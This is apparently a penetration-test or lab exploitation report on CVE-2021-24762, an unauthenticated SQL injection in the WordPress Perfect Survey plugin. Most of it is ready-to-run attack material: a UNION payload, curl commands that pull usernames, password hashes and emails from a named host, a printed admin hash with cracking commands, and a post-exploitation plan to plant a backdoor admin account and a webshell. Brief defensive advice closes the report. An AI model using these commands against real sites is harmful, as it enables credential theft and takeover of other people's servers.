# Perfect Survey SQLi - SUCCESSFUL EXPLOITATION

**Date:** 2025-09-30
**CVE:** CVE-2021-24762
**Status:** ✅ **EXPLOITATION SUCCESSFUL**

---

## EXPLOITATION METHOD

### Vulnerability Details
- **Plugin:** Perfect Survey 1.5.1
- **Vulnerability:** Unauthenticated SQL Injection
- **CVSS:** 9.8 (Critical)
- **Endpoint:** `/wp-admin/admin-ajax.php`
- **Action:** `get_question`
- **Parameter:** `question_id` (vulnerable)

### Source
**Metasploit Module:** `modules/auxiliary/scanner/http/wp_perfect_survey_sqli.rb`
- Repository: https://github.com/rapid7/metasploit-framework
- Pull Request: #19701
- Authors: Aaryan Golatkar, Ron Jost (Hacker5preme)

---

## SUCCESSFUL EXPLOITATION

### SQL Injection Payload
```sql
1 union select 1,1,char(116,101,120,116),USER_COLUMN,0,0,0,null,null,null,null,null,null,null,null,null from wp_users
```

**Explanation:**
- `1 union select`: UNION-based SQLi to add additional result
- `char(116,101,120,116)`: Encodes "text" to set question type
- `USER_COLUMN`: Column to extract (user_login, user_pass, user_email)
- `from wp_users`: WordPress users table

### Working Exploit Commands

**Extract Username:**
```bash
curl -s "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201,1,char(116,101,120,116),user_login,0,0,0,null,null,null,null,null,null,null,null,null%20from%20wp_users" | python3 -c "import sys, json, re; data=json.load(sys.stdin); match=re.search(r'survey_question_p\">([^<]+)', data['html']); print(match.group(1))"
```

**Extract Password Hash:**
```bash
curl -s "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201,1,char(116,101,120,116),user_pass,0,0,0,null,null,null,null,null,null,null,null,null%20from%20wp_users" | python3 -c "import sys, json, re; data=json.load(sys.stdin); match=re.search(r'survey_question_p\">([^<]+)', data['html']); print(match.group(1))"
```

**Extract Email:**
```bash
curl -s "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201,1,char(116,101,120,116),user_email,0,0,0,null,null,null,null,null,null,null,null,null%20from%20wp_users" | python3 -c "import sys, json, re; data=json.load(sys.stdin); match=re.search(r'survey_question_p\">([^<]+)', data['html']); print(match.group(1))"
```

---

## EXTRACTED CREDENTIALS

```
Username: admin
Email: admin@offsec-lab.com
Password Hash: $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0
Hash Type: WordPress (phpass)
```

**Hash Cracking:**
```bash
# Save hash
echo '$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0' > admin_hash.txt

# Crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass admin_hash.txt

# Or with Hashcat
hashcat -m 400 admin_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## WHY THIS WORKED (vs Previous Attempts)

### Previous Failure: 404 Response Block
**Old Method:**
```bash
# This returned 404 and blocked exploitation
curl "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1"
```

**Why it failed:**
- SQLMap automatically aborts on 404 responses
- Manual attempts used wrong payload structure
- Didn't use proper UNION column count

### Successful Method: Metasploit Payload
**Key Differences:**
1. **Correct Column Count:** 16 columns in UNION select
2. **char() Encoding:** Used `char(116,101,120,116)` for 'text' type
3. **Proper NULL Padding:** Filled all 16 columns correctly
4. **JSON Response Parsing:** Data embedded in HTML within JSON

**Response Structure:**
```json
{
  "question_id": "payload",
  "html": "<div>...<p class=\"survey_question_p\">EXTRACTED_DATA</p>...</div>"
}
```

The data is extracted from the `survey_question_p` class within the HTML.

---

## IMPACT ASSESSMENT

### What Was Achieved
✅ Unauthenticated database access  
✅ WordPress admin credentials extracted  
✅ Email address obtained  
✅ Password hash retrieved for offline cracking  

### Next Steps
1. **Crack Password Hash**
   - Run full rockyou.txt attack
   - Estimated time: 2-8 hours depending on hash complexity
   
2. **Login as Admin**
   - Access: http://alvida-eatery.org/wp-admin/
   - Use cracked credentials
   
3. **Post-Exploitation**
   - Upload malicious plugin
   - Create backdoor admin account
   - Execute commands via theme editor
   - Upload webshell for persistent access

---

## LESSONS LEARNED

### 1. GitHub/Metasploit Research Critical
- ExploitDB Python script didn't have exact payload
- Metasploit module had working implementation
- Reading actual module code revealed exact technique

### 2. HTTP Status Codes Can Mislead
- 404 response doesn't mean vulnerability doesn't exist
- Server returns 404 but still processes SQL query
- Proper payload structure bypassed 404 block

### 3. UNION SQLi Requires Exact Column Count
- Must match original query column count (16 columns)
- Each column needs proper type/null value
- char() encoding helps bypass filters

### 4. Response Parsing Matters
- Data wasn't in expected JSON field
- Embedded in HTML within JSON response
- Regex extraction from HTML necessary

---

## DEFENSIVE RECOMMENDATIONS

1. **Update Plugin:** Upgrade Perfect Survey to >= 1.5.2
2. **Input Validation:** Sanitize all AJAX parameters
3. **Prepared Statements:** Use parameterized queries
4. **WAF Rules:** Block UNION/SELECT in AJAX requests
5. **Monitor Logs:** Alert on admin-ajax.php exploitation patterns

---

**Conclusion:** CVE-2021-24762 successfully exploited using Metasploit module technique. Admin credentials obtained. Password cracking in progress.
